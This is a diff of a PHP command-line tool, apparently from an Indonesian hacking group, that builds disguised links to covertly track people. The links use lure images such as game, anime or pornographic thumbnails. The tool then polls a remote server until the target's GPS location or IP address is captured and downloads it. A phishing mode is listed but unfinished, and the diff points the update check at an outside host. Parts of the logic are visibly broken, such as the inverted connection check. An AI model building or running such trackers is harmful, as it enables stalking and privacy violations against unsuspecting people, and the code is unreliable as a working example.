@@ -1,37 +1,44 @@
 <?php 
 /*
 	Author 	: Dave Koagow
-	Team 	: { Anonymous }
+	Team 	: { IndoCyber }
 	Tools 	: Information Gathering
-	Fanspage: https://www.facebook.com/id.profile
+	Fanspage: https://www.facebook.com/IndoSecOfficial
 				{ OpenSourceCode }
 */
+
 /*
 	Configuration
 */
 $version 	= '1.0.19';
 $random 	= rand(123456789, 6);
 $url 		= 'https://www.facebook.com/login/';
+
 error_reporting(0);
+
 // cek update
 function updated($version, $file)
 {
-	$cek = file_get_contents('https://www.facebook.com/index/version.lst');
+	$cek = file_get_contents('https://brad.josebernard.com/index/version.lst');
 	$cek2 = explode("\n", $cek);
 	if ($cek2[0] == $version) {
 		echo "\n[-] Tidak Ada Pembaruan \n\n";
 	}
 }
+
 // cek koneksi
 echo "\n[+] Mengecek Koneksi Internet ...";
 $cek = get_headers('https://facebook.com');
 if (!preg_match('/200/', $cek[0])) {
 	
 	echo "\n[+] Koneksi Stabil";
+	echo "\n[+] Pembaruan ...";
+	updated($version, $file);
 }else{
 	echo "\n\n[-] Tidak Ada Koneksi Internet :'( \n\n";
 	exit();
 }
+
 function tampil()
 {
 	echo "
@@ -40,55 +47,89 @@ function tampil()
   | || '_ \| |_ / _ \| |  _ / _` | __| '_ \ 
   | || | | |  _| (_) | |_| | (_| | |_| | | |
  |___|_| |_|_|  \___/ \____|\__,_|\__|_| |_| v.".$version."
-       => Information Gathering <=                                        
-Author   : DaVe Kgw => { Anonymous }
-Contact  : 0896 Sisanya Cari Sendiri - daveamben4@gmail.com
-FansPage : https://www.facebook.com/id.profile
+
+       => Information Gathering <=
+
+"Cara pemasangan
+                                        
+pkg update && pkg upgrade
+pkg install php wget git
+pip2 install mechanize
+pip2 install requests
+pkg install --upgrade pip
+git clone git clone https://github.com/davekgw/gps_tracking
+cd gps_tracking && chmod +x gpss.php
+php gpss.php"
+
+Author   : DaVe Kgw => { IndoCyber }
+Contact  : 089631008798 - daveamben4@gmail.com
+FansPage : https://www.facebook.com/IndoSecOfficial/
+
 	--GPS  --IP  --PHISING
  > ";
 }
+
 function proses($random)
 {
 	echo "\n\n[+] Created Link\n[+] ID Tracking  : $random \n[+] Parameter => : ?page= ";
 }
-function buat_link($url, $img)
+
+function buat_link($input, $random, $url, $id, $img)
 {	
 	$imgs = base64_encode($img);
+
 	$random2 = base64_encode($random);
-	$url = 'Copy Link => '.$url, $img;
+	$url = 'Copy Link => '.$url.'&img='.$imgs;
 	echo "\n\n[+] $url";
 }
+
 function download($random, $url, $opt, $port)
 {
+
 	echo file_get_contents($url . 'get/' . 'GPS_GET'.$random.'.html');
+
 	$curl = curl_init();
 	curl_setopt($curl, CURLOPT_URL, $url.$opt.'_TRACK_'.$random.'.html');
 	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 	curl_setopt($curl, CURLOPT_HEADER, false);
 	$data = curl_exec($curl);
 	curl_close($curl);
+
 	echo "\n[+] Downloading ";
+
 	touch($opt.'_TRACK_'.$random.'.php');
+
 	$fp = fopen($opt.'_TRACK_'.$random.'.php', 'w');
 	fwrite($fp, $data);
 	fclose($fp);
+
 	echo "\n[+] Membuka File...";
 	echo "\n\n[+] Buka Browser => : http://localhost:".$port;
+
 	// run di localhost
 	system('php -S localhost:'.$port.' '.$opt.'_TRACK_'.$random.'.php');
 }
+
 tampil();
+
+
 $pilih = trim(fgets(STDIN));
+
 if ($pilih == '--GPS' || $pilih == '--gps') {
+
 	proses($random);
 	$input = trim(fgets(STDIN));
+
 	// set port
 	echo "[+] Set PORT  => : ";
 	$port = trim(fgets(STDIN));
+
 	if (is_numeric($port)) {
+
 		echo "\n(1) Hacking (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
 		echo "[+] Use Image => : ";
 		$opsi_img = trim(fgets(STDIN));
+
 		switch ($opsi_img) {
 			case '1':
 				$img = 'https://s.kaskus.id/r540x540/images/2018/05/27/10160369_201805270238430919.jpg';
@@ -113,13 +154,16 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 				exit();
 			break;
 		}
+
 		buat_link($input, $random, $url, 1, $img);
+
 		// litening
 		echo "\n\n[+] Listening Target < ";
 		$a = 1;
 		for ($a; $a < 9999; $a++) { 
 			
 			$cek = get_headers($url.'GPS_TRACK_'.$random.'.html');
+
 			// listen
 			if (!preg_match("/200/", $cek[0])) {
 				echo "=";
@@ -130,19 +174,23 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 			sleep(3);
 		}
 		// download
-		download($url, 'GPS', $port);	
+		download($random, $url, 'GPS', $port);	
 	}else{
 		echo "\n\n[-] PORT Harus Angka :'( \n\n";
 	}
+
 }elseif($pilih == '--IP' || $pilih == '--ip'){
+
 	proses($random);
 	$input = trim(fgets(STDIN));
-	echo "\n(1) Hacking (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
+
+	echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
 	echo "[+] Use Image => : ";
 	$opsi_img = trim(fgets(STDIN));
+
 	switch ($opsi_img) {
 		case '1':
-			$img = 'https://s.kaskus.id/r540x540/images/2018/05/27/10160369_201805270238430919.jpg';
+			$img = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png';
 			break;
 		case '2':
 			$img = 'https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/production/designs/3064946_0.jpg';
@@ -164,13 +212,16 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 			exit();
 		break;
 	}
-	buat_link($url, 2, $img);
+
+	buat_link($input, $random, $url, 2, $img);
+
 	// litening
 	echo "\n\n[+] Listening Target < ";
 	$a = 1;
 	for ($a; $a < 9999; $a++) { 
 		
 		$cek = get_headers($url.'get/IP_GET'.$random.'.html');
+
 		// listen
 		if (!preg_match("/200/", $cek[0])) {
 			echo "=";
@@ -182,12 +233,15 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 		}
 		sleep(3);
 	}
+
 }elseif($pilih == '--PHISING'){
 	echo "\n\n[-] Masih Di Bikin Bozzzz !!! \n\n";
 }elseif($pilih == 'exit'){
 	exit();
 }else{
+
 	echo "\n\n[-] Error Code :'(\n\n";
 	exit();
 }
+
 ?>
